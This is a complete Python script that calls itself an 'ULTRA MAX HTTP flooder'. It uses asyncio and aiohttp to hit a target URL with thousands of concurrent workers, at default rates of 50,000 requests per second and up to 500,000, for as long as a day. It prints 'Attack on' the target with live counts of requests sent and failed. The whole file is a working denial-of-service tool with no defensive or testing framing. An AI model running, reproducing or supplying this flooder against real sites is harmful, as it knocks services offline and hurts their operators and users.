#!/usr/bin/env python3
import asyncio
import aiohttp
import time
import sys
import argparse

async def send_request(session, url, stats, lock):
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=2)) as resp:
            async with lock:
                stats['sent'] += 1
                if resp.status >= 400:
                    stats['failed'] += 1
    except:
        async with lock:
            stats['sent'] += 1
            stats['failed'] += 1

async def worker(session, url, rate_per_sec, duration, stats, lock):
    delay = 1.0 / rate_per_sec if rate_per_sec > 0 else 0
    end = time.time() + duration
    while time.time() < end:
        start = time.time()
        await send_request(session, url, stats, lock)
        elapsed = time.time() - start
        if delay > elapsed:
            await asyncio.sleep(delay - elapsed)

async def run_attack(url, total_rate, duration, max_concurrent):
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as session:
        stats = {'sent': 0, 'failed': 0}
        lock = asyncio.Lock()
        rate_per_worker = max(1, total_rate // max_concurrent)
        tasks = []
        for _ in range(max_concurrent):
            task = asyncio.create_task(worker(session, url, rate_per_worker, duration, stats, lock))
            tasks.append(task)
        start = time.time()
        try:
            while tasks:
                await asyncio.sleep(1)
                elapsed = time.time() - start
                async with lock:
                    sent = stats['sent']
                    failed = stats['failed']
                rate = sent / elapsed if elapsed > 0 else 0
                print(f"\r📊 Elapsed: {elapsed:.1f}s | Sent: {sent} | Failed: {failed} | Rate: {rate:.1f} req/s", end='')
                tasks = [t for t in tasks if not t.done()]
        except KeyboardInterrupt:
            print("\n🛑 Stopped by user")
        await asyncio.gather(*tasks, return_exceptions=True)
        elapsed = time.time() - start
        print(f"\n✅ Finished in {elapsed:.1f}s")
        print(f"Total requests: {stats['sent']}, Failed: {stats['failed']}")

def main():
    parser = argparse.ArgumentParser(description='ULTRA MAX HTTP flooder (asyncio)')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('-t', '--threads', type=int, default=1000, help='Concurrent workers (default 1000, max 50000)')
    parser.add_argument('-r', '--rate', type=int, default=50000, help='Requests/sec (default 50000, max 500000)')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Seconds (default 60, max 86400)')
    args = parser.parse_args()

    if args.threads > 50000:
        print("❌ Max workers is 50000")
        sys.exit(1)
    if args.rate > 500000:
        print("❌ Max rate is 500000 req/s")
        sys.exit(1)
    if args.duration > 86400:
        print("❌ Max duration is 86400 seconds (1 day)")
        sys.exit(1)

    print(f"🚀 ULTRA MAX Attack on {args.url}")
    print(f"   Workers: {args.threads}, Rate: {args.rate} req/s, Duration: {args.duration}s")
    asyncio.run(run_attack(args.url, args.rate, args.duration, args.threads))

if __name__ == "__main__":
    main()
